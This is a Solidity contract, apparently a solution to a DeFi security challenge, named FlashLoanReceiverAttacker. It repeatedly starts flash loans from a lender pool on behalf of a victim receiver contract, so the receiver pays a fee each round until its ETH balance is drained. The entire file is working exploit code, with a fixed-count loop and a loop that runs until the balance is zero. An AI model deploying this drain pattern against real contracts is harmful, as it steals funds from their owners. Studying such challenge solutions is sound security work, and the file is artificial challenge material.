pragma solidity 0.8.19;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";

contract FlashLoanReceiverAttacker {
    // slot 0
    bytes4 constant s_ethTransferFailedSelector = 0xb12d13eb;
    bytes4 constant s_invalidCallerSelector = 0x48f5c3ed;
    bytes4 constant s_unsupportedCurrencySelector = 0x2263f4e2;
    address immutable i_token;
    // slot 1
    IERC3156FlashLender immutable i_pool;
    // slot 2
    IERC3156FlashBorrower immutable i_receiver;

    error FlashLoanAttackFailed(uint256 iteration, bytes reason); // 0xc89f1316
    error FlashLoanAttackFailedEthTransferFailed(uint256 iteration); // 0xd6142204
    error FlashLoanAttackFailedInvalidCaller(uint256 iteration); // 0xa590d8d1
    error FlashLoanAttackFailedUnsupportedCurrency(uint256 iteration); // 0xc41a06c2

    constructor(address _token, address _pool, address _receiver) {
        i_token = _token;
        i_pool = IERC3156FlashLender(_pool);
        i_receiver = IERC3156FlashBorrower(_receiver);
    }

    /**
     * @notice This method allows to empty `FlashLoanReceiver` ETH balance in a single tx (all paid to
     * `NaiveReceiverLenderPool` as flash fee).
     */
    function flashLoanAttack(
        uint256 _iterations,
        uint256 _amount,
        bytes calldata _data
    ) external {
        for (uint256 i; i < _iterations; ) {
            try i_pool.flashLoan(i_receiver, i_token, _amount, _data) {} catch (
                bytes memory reason
            ) {
                // Playground
                bytes4 reason4 = bytes4(reason);
                if (reason4 == s_ethTransferFailedSelector) {
                    revert FlashLoanAttackFailedEthTransferFailed(i);
                }
                if (reason4 == s_invalidCallerSelector) {
                    revert FlashLoanAttackFailedInvalidCaller(i);
                }
                if (reason4 == s_unsupportedCurrencySelector) {
                    revert FlashLoanAttackFailedUnsupportedCurrency(i);
                }
                revert FlashLoanAttackFailed(i, reason);
            }
            unchecked {
                ++i;
            }
        }
    }

    /**
     * @notice This method allows to empty `FlashLoanReceiver` ETH balance in a single tx (all paid to
     * `NaiveReceiverLenderPool` as flash fee).
     */
    function flashLoanAttackAuto(
        uint256 _amount,
        bytes calldata _data
    ) external {
        address receiverAddr = address(i_receiver);
        uint256 iteration;
        do {
            try i_pool.flashLoan(i_receiver, i_token, _amount, _data) {} catch (
                bytes memory reason
            ) {
                // Playground
                bytes4 reason4 = bytes4(reason);
                if (reason4 == s_ethTransferFailedSelector) {
                    revert FlashLoanAttackFailedEthTransferFailed(iteration);
                }
                if (reason4 == s_invalidCallerSelector) {
                    revert FlashLoanAttackFailedInvalidCaller(iteration);
                }
                if (reason4 == s_unsupportedCurrencySelector) {
                    revert FlashLoanAttackFailedUnsupportedCurrency(iteration);
                }
                revert FlashLoanAttackFailed(iteration, reason);
            }
            unchecked {
                ++iteration;
            }
        } while (receiverAddr.balance > 0);
    }
}
